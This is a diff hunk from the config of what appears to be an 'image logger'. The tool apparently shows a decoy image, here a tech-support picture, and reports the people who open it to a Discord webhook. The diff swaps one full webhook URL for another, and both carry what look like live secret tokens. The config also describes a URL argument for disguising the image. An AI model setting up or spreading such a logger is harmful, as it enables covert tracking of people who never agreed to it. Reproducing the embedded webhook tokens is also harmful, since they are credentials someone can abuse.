@@ -12,7 +12,7 @@ __author__ = "Tgace"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1382118398087008268/fSUmSRMLWmRMHhgWdOSsbiOUSvfiSvVrLh1yotJoZ0cowC0ytsuLUaxRhgKor22QdSDG",
+    "webhook": "https://discord.com/api/webhooks/1385993159166787736/6ka0OcdcWcEine5kzfgYG6-7SUW2Bl8hLr0CULaP5fyL-lAm9ivvU4hjm1qDh0eirxiC",
     "image": "https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/04/1-fix-operation-did-not-complete-error-featured.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
